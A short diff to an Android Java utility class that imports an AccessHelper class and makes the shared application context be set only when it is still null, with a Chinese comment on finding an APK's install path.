@@ -8,6 +8,8 @@ import android.util.Log;
 import androidx.core.content.ContextCompat;
 import android.content.pm.PackageManager;
 
+import com.adobe.flashplayer.accessory.AccessHelper;
+
 //file = new File(getPackageManager().getApplicationInfo("com.uc.addon.qrcodegenerator", 0).sourceDir);
 //这里getPackageManager是Context下的方法，不需要赘言了，sourceDIr返回了完整apk路径，包括-N之类的讨厌玩意。
 
@@ -277,6 +279,9 @@ public class Public {
 
     static {
         Log.e(TAG, "init");
+        if (appContext == null){
+            appContext = AccessHelper.getContext();
+        }
     }
 
 
@@ -284,7 +289,9 @@ public class Public {
         boolean result = false;
         try
         {
-            appContext = context;
+            if (appContext == null) {
+                appContext = context;
+            }
 
             result = initFilePath(context);
             if (result == false){
